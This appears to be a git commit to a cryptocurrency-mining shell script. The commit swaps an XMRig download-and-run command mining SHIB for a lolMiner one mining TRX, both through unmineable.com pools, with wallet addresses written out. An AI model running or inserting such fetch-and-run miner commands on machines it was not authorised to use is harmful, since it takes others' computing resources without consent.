a6a9df20a0d574fc82428a1f23f54d9a6035ffc4
Riski473 <86213839+Riski473@users.noreply.github.com>
2021-10-30 15:50:00 +0700

    Update wqew.sh

--- wqew.sh
+++ wqew.sh
@@ -1,2 +1,4 @@
-wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && tar -zxf xmrig-5.11.3-xenial-x64.tar.gz && cd xmrig-5.11.3
-./xmrig --donate-level 5 -o rx.unmineable.com:3333 -u SHIB:0xbd2839836245eb879c2f4ab88af5b4959537e25a.4 -p x -k -a rx/0
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.32/lolMiner_v1.32a_Lin64.tar.gz
+tar -xf lolMiner_v1.32a_Lin64.tar.gz
+cd 1.32a
+./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TKMzEThte1Nji2rKMHnK5Ggb46UMi3YVmT.2#df70-vshw --ethstratum ETHPROXY
